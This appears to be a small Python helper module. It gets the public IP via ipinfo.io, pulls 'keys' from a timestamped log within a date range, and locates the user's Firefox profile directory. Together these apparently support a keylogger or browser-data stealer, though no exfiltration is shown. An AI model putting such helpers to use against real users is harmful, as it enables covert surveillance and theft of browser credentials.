import requests
from datetime import datetime
import os

def get_public_ip():
    response = requests.get('https://ipinfo.io')
    data = response.json()
    return data['ip']

def convert_timestamp_to_datetime(timestamp : float):
    return datetime.fromtimestamp(timestamp)

def get_keys_in_datetime_range(file_path, start_dt, end_dt):
    keys = []
    
    with open(file_path, "r") as file:
        for line in file:
            parts = line.split()
            log_datetime = " ".join(parts[0:5])
            log_dt = datetime.strptime(log_datetime, "%a %b %d %H:%M:%S %Y")
            if start_dt <= log_dt <= end_dt:
                keys.append(parts[-1])
    
    return keys

def find_firefox_profile():
    with open(f"/home/{os.getlogin()}/.mozilla/firefox/profiles.ini", "r") as file:
        file.readline()
        default = file.readline()
    return default.split("=")[1][:-1]